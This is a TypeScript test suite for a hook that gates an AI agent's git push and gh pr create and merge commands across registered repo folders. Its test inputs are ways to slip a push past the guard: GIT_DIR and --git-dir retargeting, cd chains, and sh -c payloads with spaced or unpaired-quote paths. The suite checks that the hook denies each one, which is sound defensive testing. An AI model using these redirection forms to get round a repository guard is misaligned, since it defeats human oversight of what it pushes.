  // Change that breaks it: judge a CCv3 target with the app rule, or deny an unresolvable value in a CCv3 checkout with app-push.
  it('GIT_DIR or --git-dir aimed at the CCv3 repo, or at a missing folder, from a CCv3 cwd: scope push, the base text', async () => {
    for (const cmd of ['GIT_DIR=/work/cc/.git git push fork feat', 'git --git-dir=/work/cc/.git push fork feat', 'GIT_DIR=/nowhere/.git git push fork feat', 'GIT_DIR=$X git push fork feat']) {
      const r = await denyOf(bash(cmd, '/work/cc'), CC_PUSH);
      expect(r, cmd).toMatchObject({ pattern: 'push-target-unresolved', scope: 'push' });
      expect(r!.reason, cmd).not.toMatch(/judged for Dave's tap|\(folder /);
    }
  });
  // Change that breaks it: read the move value from the cwd only (a relative value is resolved from the cwd).
  // Ruling B, unresolvable value: a literal path git cannot read that lies under a live root (the path test of coveredAmong) takes
  // app-push; a variable value keeps the cwd rule. Change that breaks it: skip the path test for a move target git cannot read.
  it('GIT_DIR at a missing folder under the live root /work/app-x, from an unregistered cwd: denied, scope app-push', async () => {
    expect((await denyOf(bash('GIT_DIR=/work/app-x/gone/.git git push up topic', '/work/stray'), devX()))?.scope).toBe('app-push');
    expect(await verdict(bash('GIT_DIR=$X git push up topic', '/work/stray'), devX())).toMatchObject({ action: 'allow', scope: 'push' });
  });
  // Change that breaks it: resolve a relative move value from the payload cwd only (the cd before it moves the shell first).
  it('R5 F3b cd /work/app-x && GIT_DIR=.git git push up topic from a CCv3 cwd: denied, scope app-push', async () => {
    expect((await denyOf(bash('cd /work/app-x && GIT_DIR=.git git push up topic', '/work/cc'), devX()))?.scope).toBe('app-push');
  });
  // Ruling B names the push: a GIT_DIR before a create or merge keeps the cwd rule (no move target is read for it).
  it('a GIT_DIR at the app repo before a create from a CCv3 cwd keeps the base repo-moved text', async () => {
    const r = await denyOf(bash('GIT_DIR=/work/app-x/.git gh pr create --draft --head feat --title t', '/work/cc'), devX());
    expect(r).toMatchObject({ pattern: 'repo-moved', scope: 'other' });
    expect(r!.reason).not.toMatch(/judged for Dave's tap/);
  });
  it('a relative GIT_DIR from /work names /work/app-x: denied, scope app-push', async () => {
    expect((await denyOf(bash('GIT_DIR=app-x/.git git push up topic', '/work'), { ...devX(), folders: { ...devX().folders, '/work': { remotes: gh('acme/work') } } }))?.scope).toBe('app-push');
  });
});

describe('Seat review 1 (fix round 7): items 1, 3, 4 and 6 on the app path', () => {
  // Item 1. Change that breaks it: commandRepo reads -R only after a space (REPO_FLAG alone), or cmdRepoOf drops the cluster variable test.
  it('item 1: a -fR or -dR cluster that names another repo is repo-differs, and -dR $R is repo-unreadable, even with the folder tap', async () => {
    openX();
    mergeX();
    expect((await denyOf(bash(`${CREATE} -fR other/repo`)))?.pattern).toBe('repo-differs');
    expect((await denyOf(bash(`${MERGE} -dRother/repo`)))?.pattern).toBe('repo-differs');
    expect((await denyOf(bash(`${MERGE} -dR $R`)))?.pattern).toBe('repo-unreadable');
    expect(await passes(bash(`${MERGE} -dR acme/app-x`))).toBe(true);
  });
  // CCv3 effect of item 1, outside the 8 G4 rows (proof-g4 has no cluster payload), for the seat to rule on: the R5c rule now reads the
  // cluster too, so a CCv3 merge with -dR <other repo> is repo-foreign ("go to that repo folder"); at fb468d52 the CCv3 key judged it.
  // A cluster that names CCv3 itself keeps the CCv3 rule. Change that breaks it: commandRepo without the cluster pattern.
  it('item 1, CCv3: -dR other/lib from a CCv3 folder is repo-foreign; -dR of the CCv3 repo keeps the land rule', async () => {
    expect((await denyOf(bash(`${MERGE} -dR other/lib`, '/work/cc')))?.pattern).toBe('repo-foreign');
    expect((await denyOf(bash(`${MERGE} -dR Rev4nchist/Continuous-Claude-v3`, '/work/cc')))?.pattern).toBe('land');
  });
});

describe('Seat review 1, item 6: the app-ask script path is quoted in app texts', () => {
  // Change that breaks it: print the script path unquoted (a home with a space splits the node argument), or quote a home with a quote mark.
  it('a home with a space: the offer command holds the script path in single quotes; a home with a quote mark gets the stop line', async () => {
    const spaced = await decideParsed(bash(PUSH), { ...deps(), home: '/home/te ster' });
    expect(spaced.action === 'deny' && spaced.reason).toContain("run node '/home/te ster/continuous-claude/scripts/github/app-ask.mjs' push --remote up");
    const quoted = await decideParsed(bash(PUSH), { ...deps(), home: "/home/o'brien" });
    expect(quoted.action === 'deny' && quoted.reason).toContain('cannot be passed safely in a command; tell Dave.');
    expect(quoted.action === 'deny' && quoted.reason).not.toContain('app-ask.mjs push');
  });
  it('the CCv3 text keeps its relative ship-ask path, unquoted', async () => {
    const r = await denyOf(bash(CREATE, '/work/cc'));
    expect(r?.reason).toContain('run node scripts/github/ship-ask.mjs open-pr');
  });
});

describe('Seat review 1, item 3: an app "Push only" tap is bound to the head app-ask stored, not only to the tree', () => {
  const moved = (extra: Folder = {}): World => ({ folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), heads: { feat: HEAD2, main: HEAD2 }, ...extra } } });
  // Change that breaks it: compare the tree only for an app Push only tap (the old shipTap rule).
  it('Push only for head A does not clear a push whose ref is at head B with the same tree; at head A it does', async () => {
    shipX('Push only');
    expect(await denyOf(bash(PUSH), moved())).toMatchObject({ pattern: 'ship', scope: 'app-push' });
    expect(await passes(bash(PUSH))).toBe(true);
  });
  // Change that breaks it: require the head for "Commit and push" too (the commit moves the head after the tap).
  it('Commit and push keeps the tree rule: the head moved by the chained commit does not matter', async () => {
    shipX('Commit and push');
    expect(await passes(bash(PUSH), moved())).toBe(true);
    expect(await passes(bash(`git commit -m x && ${PUSH}`), moved({ indexTree: TREE }))).toBe(true);
  });
  // G4: the CCv3 shipTap is unchanged. Change that breaks it: pass the head rule to the CCv3 call of shipTap.
  it('CCv3: a Push only tap with another head still clears a push of the same tree', async () => {
    tap('ship', 'Rev4nchist/Continuous-Claude-v3@feat', 'b'.repeat(40), 'Push only', TREE);
    expect(await passes(bash('git push fork feat', '/work/cc'), { config: JSON.stringify({ decisions: { enforce: true, enforcePush: true } }) })).toBe(true);
  });
});

/**
 * Round 3 C3 (F-1, seat ruling 2026-11-15 08:55): the folder of a raw payload push is read with its quotes, so a covered folder whose name
 * holds a space is found (today the reader deletes the quotes and cuts the value at the space). A payload whose folder sits inside an
 * unpaired quote cannot be read: push-target-unresolved in every folder, an uncovered one too (seat ACCEPTED cost, PR body item 1).
 */
describe('C3 (round 3) a raw payload push folder is read whole, or the push is denied', () => {
  const SPACE: World = {
    folders: { ...FOLDERS, '/work/My App': { remotes: gh('acme/space'), remoteHead: 'develop', trees: TREES_ALL } },
    registry: JSON.stringify({ projects: [...REGISTRY.projects, { key: 'space-app', path: '/work/My App' }] }),
  };
  // Change that breaks it: rawDirs deletes every quote mark and splits on spaces (the folder is cut to /work/My, which nobody covers).
  it('C3-F1: sh -c with a quoted -C folder that holds a space reaches the tap path of that covered folder', async () => {
    for (const c of [`sh -c 'git -C "/work/My App" push up main'`, `bash -c "cd '/work/My App' && git push up main"`]) {
      const r = await denyOf(bash(c, '/work/none'), SPACE);
      expect(r, c).not.toBeNull();
      expect(r!.scope, c).toBe('app-push');
      expect(r!.pattern, c).toBe('push-target-unresolved');
    }
  });
  // Change that breaks it: an unpaired quote in a payload push folder falls back to the cut words (an uncovered folder passes).
  it('C3-F2: a payload push whose folder sits in an unpaired quote is push-target-unresolved, from an uncovered cwd too', async () => {
    const r = await denyOf(bash(`sh -c 'git -C "/work/My App push up main'`, '/work/none'), SPACE);
    // C2b (class C): main with a parse gives this answer; the hand reader is retired. The parser cannot read the unpaired quote: parse-error (still a deny).
    expect(r?.pattern).toBe('parse-error');
  });
  // Cost: a payload push in an uncovered folder with a plain readable path keeps its result (today: allow).
  it('C3-FC1 (cost): a payload push from an uncovered folder to an uncovered folder with a readable path is still allowed', async () => {
    expect(await verdict(bash(`sh -c 'git -C "/work/none/x y" push up main'`, '/work/none'), SPACE)).toEqual({ action: 'allow' });
  });
});

/** Round 3 C1-12, CLI :1681 (seat word 2026-11-15): a gh flag-first create or merge outside CCv3 keeps the registry-corrupt deny. */
describe('C1-12 (round 3) a flag-first gh call with a corrupt registry', () => {
  // Change that breaks it: ghFlagFirstDenies returns nothing for a folder that is not CCv3 when the registry does not parse.
  it('gh -R <repo> pr create and pr merge in a folder outside CCv3 are registry-corrupt while the registry cannot be read', async () => {
    for (const c of ['gh -R acme/app-x pr create --fill', `gh -R acme/app-x pr merge 7 --squash --match-head-commit ${HEAD}`]) {
      expect((await denyOf(bash(c, '/work/stray'), { registry: '{bad' }))?.pattern, c).toBe('registry-corrupt');
    }
  });
});
